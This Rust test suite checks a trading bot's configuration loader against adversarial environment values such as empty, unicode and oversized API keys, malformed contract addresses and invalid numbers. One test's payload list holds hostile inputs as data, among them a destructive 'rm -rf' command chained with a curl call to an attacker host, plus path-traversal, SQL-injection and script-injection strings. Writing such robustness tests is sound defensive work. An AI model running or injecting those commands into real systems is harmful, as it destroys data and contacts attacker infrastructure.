//! Challenger Stress Suite: Adversarial Environment Conditions for crates/core/src/config.rs
//!
//! Authoritative source: Task 3 - Challenge crates/core/src/config.rs under adversarial
//! environment conditions: missing ALCHEMY_KEY, empty ALCHEMY_KEY, malformed characters.

use alloy_primitives::Address;
use flash_core::config::{AppConfig, ConfigError};
use std::env;
use std::fs;
use std::path::PathBuf;
use std::str::FromStr;
use std::sync::Mutex;

// Global mutex to synchronize environment mutation across tests in this binary
static ENV_LOCK: Mutex<()> = Mutex::new(());

const FORBIDDEN_FALLBACK: &str = "forbidden_test_key";

/// RAII helper that moves the process current directory to a clean temp directory
/// with NO `.env` file, and clears relevant environment variables.
struct IsolatedEnvScope {
    orig_dir: PathBuf,
    temp_dir: PathBuf,
}

impl IsolatedEnvScope {
    fn new(test_name: &str) -> Self {
        let orig_dir = env::current_dir().expect("Failed to get current dir");
        let temp_dir = env::temp_dir().join(format!("flash_core_adv_{}_{}", test_name, std::process::id()));
        let _ = fs::create_dir_all(&temp_dir);
        env::set_current_dir(&temp_dir).expect("Failed to switch to temp dir");

        // Clear all relevant env vars
        reset_all_env_vars();

        Self { orig_dir, temp_dir }
    }
}

impl Drop for IsolatedEnvScope {
    fn drop(&mut self) {
        reset_all_env_vars();
        let _ = env::set_current_dir(&self.orig_dir);
        let _ = fs::remove_dir_all(&self.temp_dir);
    }
}

fn reset_all_env_vars() {
    env::remove_var("ALCHEMY_KEY");
    env::remove_var("ARBITRUM_RPC_WS");
    env::remove_var("ARBITRUM_RPC_HTTP");
    env::remove_var("ARBITRUM_SEQUENCER_FEED");
    env::remove_var("BASE_RPC_WS");
    env::remove_var("BASE_RPC_HTTP");
    env::remove_var("BASE_FLASHBLOCKS_WS");
    env::remove_var("EXECUTION_MODE");
    env::remove_var("LOG_LEVEL");
    env::remove_var("SIGNER_PRIVATE_KEYS");
    env::remove_var("EXECUTOR_CONTRACT_ADDRESS");
    env::remove_var("MAX_HOPS");
    env::remove_var("KILL_SWITCH_FEED_LAG_MS");
    env::remove_var("KILL_SWITCH_FAST_REVERT_COUNT");
}

#[test]
fn test_adversarial_missing_alchemy_key_pure_clean_env() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("missing_key");

    // Pure clean environment: no .env, no ALCHEMY_KEY, no RPC vars
    let res = AppConfig::load();
    assert!(
        matches!(res, Err(ConfigError::MissingVar(ref v)) if v == "ALCHEMY_KEY"),
        "Missing ALCHEMY_KEY must fail fast with Err(ConfigError::MissingVar)"
    );
}

#[test]
fn test_adversarial_empty_alchemy_key() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("empty_key");

    env::set_var("ALCHEMY_KEY", "");
    let res = AppConfig::load();
    assert!(
        matches!(res, Err(ConfigError::MissingVar(ref v)) if v == "ALCHEMY_KEY"),
        "Empty ALCHEMY_KEY must fail fast with Err(ConfigError::MissingVar)"
    );
}

#[test]
fn test_adversarial_whitespace_only_alchemy_key() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("whitespace_key");

    let spaces = "   \t   ";
    env::set_var("ALCHEMY_KEY", spaces);
    let res = AppConfig::load();
    assert!(
        matches!(res, Err(ConfigError::MissingVar(ref v)) if v == "ALCHEMY_KEY"),
        "Whitespace-only ALCHEMY_KEY must fail fast with Err(ConfigError::MissingVar)"
    );
}

#[test]
fn test_adversarial_special_symbols_and_path_traversal() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("special_symbols");

    let payloads = [
        "../../etc/passwd",
        "; rm -rf /; curl http://attacker.com",
        "key' OR '1'='1' --",
        "null%00byte%20escape",
        "~`!@#$%^&*()_+={}|[]\\:\";'<>?,./",
        "<script>alert(1)</script>",
        "key with spaces and\ttabs",
    ];

    for payload in &payloads {
        env::set_var("ALCHEMY_KEY", payload);

        let config = AppConfig::load()
            .unwrap_or_else(|e| panic!("AppConfig::load failed on payload '{}': {:?}", payload, e));

        assert_eq!(&config.alchemy_key, payload);
        assert_eq!(
            config.arbitrum_rpc_ws,
            format!("wss://arb-mainnet.g.alchemy.com/v2/{}", payload)
        );
        assert_ne!(&config.alchemy_key, FORBIDDEN_FALLBACK);
    }
}

#[test]
fn test_adversarial_unicode_and_emojis() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("unicode_key");

    let unicode_keys = [
        "🦀_rust_bot_key_🚀_12345",
        "عربى_alchemy_key_اختبار",
        "русский_ключ_алхимии_999",
        "日本語のキーテスト_777",
        "\u{200B}\u{200C}\u{200D}\u{FEFF}", // Zero-width spaces & joiners
        "🔥⚡💯💎",
    ];

    for key in &unicode_keys {
        env::set_var("ALCHEMY_KEY", key);

        let config = AppConfig::load()
            .unwrap_or_else(|e| panic!("AppConfig::load failed on unicode key '{}': {:?}", key, e));

        assert_eq!(&config.alchemy_key, key);
        assert_eq!(
            config.arbitrum_rpc_ws,
            format!("wss://arb-mainnet.g.alchemy.com/v2/{}", key)
        );
    }
}

#[test]
fn test_adversarial_massive_key_stress() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("giant_key");

    let giant_key = "A".repeat(65536);
    env::set_var("ALCHEMY_KEY", &giant_key);

    let config = AppConfig::load().expect("AppConfig::load should handle giant key");
    assert_eq!(config.alchemy_key.len(), 65536);
    assert!(config.arbitrum_rpc_ws.len() > 65536);
}

#[test]
fn test_adversarial_malformed_executor_address() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("malformed_address");

    env::set_var("ALCHEMY_KEY", "dummy_key");

    // Invalid hex length
    env::set_var("EXECUTOR_CONTRACT_ADDRESS", "0x12345");
    match AppConfig::load() {
        Err(ConfigError::AddressParse { var, .. }) => {
            assert_eq!(var, "EXECUTOR_CONTRACT_ADDRESS");
        }
        other => panic!("Expected ConfigError::AddressParse, got {:?}", other),
    }

    // Invalid hex characters
    env::set_var("EXECUTOR_CONTRACT_ADDRESS", "0xZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ");
    match AppConfig::load() {
        Err(ConfigError::AddressParse { var, .. }) => {
            assert_eq!(var, "EXECUTOR_CONTRACT_ADDRESS");
        }
        other => panic!("Expected ConfigError::AddressParse, got {:?}", other),
    }

    // Missing address defaults to Address::ZERO in shadow mode
    env::remove_var("EXECUTOR_CONTRACT_ADDRESS");
    env::set_var("EXECUTION_MODE", "shadow");
    let cfg = AppConfig::load().expect("Should default to Address::ZERO in shadow mode");
    assert_eq!(cfg.executor_contract_address, Address::ZERO);

    // Live mode with Address::ZERO must fail
    env::set_var("EXECUTION_MODE", "live");
    env::remove_var("EXECUTOR_CONTRACT_ADDRESS");
    match AppConfig::load() {
        Err(ConfigError::InvalidValue { var, .. }) => {
            assert_eq!(var, "EXECUTOR_CONTRACT_ADDRESS");
        }
        other => panic!("Expected ConfigError::InvalidValue in live mode, got {:?}", other),
    }

    // Valid 20-byte address format in live mode
    let valid_addr = "0x1111111111111111111111111111111111111111";
    env::set_var("EXECUTOR_CONTRACT_ADDRESS", valid_addr);
    let cfg = AppConfig::load().expect("Should parse valid address in live mode");
    assert_eq!(cfg.executor_contract_address, Address::from_str(valid_addr).unwrap());
}

#[test]
fn test_adversarial_malformed_numeric_parameters() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("malformed_numbers");

    env::set_var("ALCHEMY_KEY", "dummy_key");

    // Adversarial non-numeric strings should gracefully fall back to defaults
    env::set_var("MAX_HOPS", "not_a_number");
    env::set_var("KILL_SWITCH_FEED_LAG_MS", "-999");
    env::set_var("KILL_SWITCH_FAST_REVERT_COUNT", "infinity");

    let config = AppConfig::load().expect("AppConfig::load should not panic on invalid numbers");
    assert_eq!(config.max_hops, 3, "Default MAX_HOPS must be 3");
    assert_eq!(config.kill_switch_feed_lag_ms, 100, "Default lag must be 100ms");
    assert_eq!(config.kill_switch_fast_revert_count, 3, "Default revert count must be 3");
}

#[test]
fn test_adversarial_explicit_rpc_urls_override_key() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("rpc_override");

    env::set_var("ALCHEMY_KEY", "dummy_key");
    env::set_var("ARBITRUM_RPC_WS", "wss://custom.node.internal:8546");
    env::set_var("BASE_RPC_HTTP", "https://custom-base.node.internal:8545");

    let config = AppConfig::load().expect("Should load custom RPC URLs");
    assert_eq!(config.arbitrum_rpc_ws, "wss://custom.node.internal:8546");
    assert_eq!(config.base_rpc_http, "https://custom-base.node.internal:8545");
}

#[test]
fn test_concurrent_app_config_load() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let _scope = IsolatedEnvScope::new("concurrency");

    env::set_var("ALCHEMY_KEY", "dummy_key");

    // Spawn 16 threads calling AppConfig::load() concurrently
    let handles: Vec<_> = (0..16)
        .map(|_| {
            std::thread::spawn(|| {
                for _ in 0..50 {
                    let cfg = AppConfig::load().expect("Concurrent load must succeed");
                    assert_ne!(cfg.alchemy_key, FORBIDDEN_FALLBACK);
                }
            })
        })
        .collect();

    for h in handles {
        h.join().expect("Thread should not panic");
    }
}
